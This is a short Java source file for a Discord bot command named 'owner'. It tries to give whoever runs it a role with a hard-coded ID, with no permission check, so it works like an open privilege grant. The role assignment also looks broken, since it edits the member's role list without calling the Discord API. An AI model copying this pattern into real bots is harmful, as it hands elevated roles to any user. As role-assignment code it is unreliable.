package me.kancer.discord.commands;

import com.jagrosh.jdautilities.command.Command;
import com.jagrosh.jdautilities.command.CommandEvent;
import net.dv8tion.jda.api.entities.Role;

import java.util.List;

public class OwnerAt extends Command {

    public OwnerAt() {
        super.name = "owner";
    }
    @Override
    public void execute(CommandEvent event) {
        Role role = event.getGuild().getRoleById(452199398043025409L);
        event.getMember().getRoles().add(role);
    }

}
